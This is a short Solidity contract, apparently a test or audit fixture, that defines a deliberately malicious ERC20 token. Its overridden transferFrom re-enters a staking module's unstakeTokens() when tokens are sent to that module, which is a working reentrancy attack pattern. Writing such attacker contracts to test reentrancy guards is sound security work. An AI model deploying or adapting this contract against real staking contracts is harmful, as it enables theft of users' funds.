// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

interface IStakingModule {
    function unstakeTokens() external;
}

contract MaliciousToken is ERC20 {
    IStakingModule public staking;
    bool private reentered;

    constructor(address stakingAddress) ERC20("Malicious", "MAL") {
        // пока указываем заглушку, перезальём позже
        staking = IStakingModule(stakingAddress);
        // раздадим 1 000 токенов атакующему
        _mint(msg.sender, 1000 * 10 ** decimals());
    }

    /// @notice Позволяет установить правильный адрес StakingModule после деплоя
    function setStaking(address stakingAddress) external {
        staking = IStakingModule(stakingAddress);
    }

    /// @notice Переопределяем transferFrom, чтобы при попытке автопополнения (to == StakingModule)
    /// вызвать реентранси в unstakeTokens()
    function transferFrom(address from, address to, uint256 amount)
        public
        override
        returns (bool)
    {
        if (to == address(staking) && !reentered) {
            reentered = true;
            // пытаемся войти повторно
            staking.unstakeTokens();
        }
        return super.transferFrom(from, to, amount);
    }
}
